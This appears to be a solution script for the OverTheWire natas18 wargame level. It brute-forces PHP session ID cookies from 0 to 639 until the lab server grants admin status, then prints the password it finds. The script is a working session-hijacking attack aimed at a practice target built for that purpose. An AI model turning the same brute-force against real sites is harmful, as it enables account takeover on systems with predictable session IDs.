import requests
import Auther
target = "http://natas18.natas.labs.overthewire.org/"
# Replace with natas17 password
auth = ("natas18", Auther.findAuth(18))

if auth[1] is None:
    print("natas18's password is not found")
    exit(-1)

for phpSessionId in range(0, 640):
    print(f"Progress: {phpSessionId}/640")
    r = requests.post(target, {"username": "foo",
                      "password": "bar"}, auth=auth, cookies={"PHPSESSID": f"{phpSessionId}"})
    if "You are an admin" in r.text:
        print(f"Admin session id: {phpSessionId}")
        print(next((line for line in r.text.splitlines() if line.startswith(
            "Password: ")), "").split(":")[1].strip()[0:32])
        break
